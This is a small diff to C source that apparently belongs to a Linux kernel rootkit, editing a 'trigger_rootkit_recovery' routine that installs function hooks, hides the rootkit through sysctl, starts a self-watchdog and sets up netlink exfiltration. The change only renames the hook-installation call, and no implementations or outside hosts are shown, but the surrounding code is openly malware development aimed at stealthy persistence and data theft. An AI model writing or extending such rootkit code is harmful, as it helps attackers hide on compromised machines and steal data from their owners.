@@ -6,7 +6,7 @@
 #include "netlink_exfil.h"
 
 void trigger_rootkit_recovery(void) {
-    fh_install_hooks();
+    fh_install_all();
     setup_sysctl_hiding();
     start_self_watchdog();
     setup_netlink_exfil();
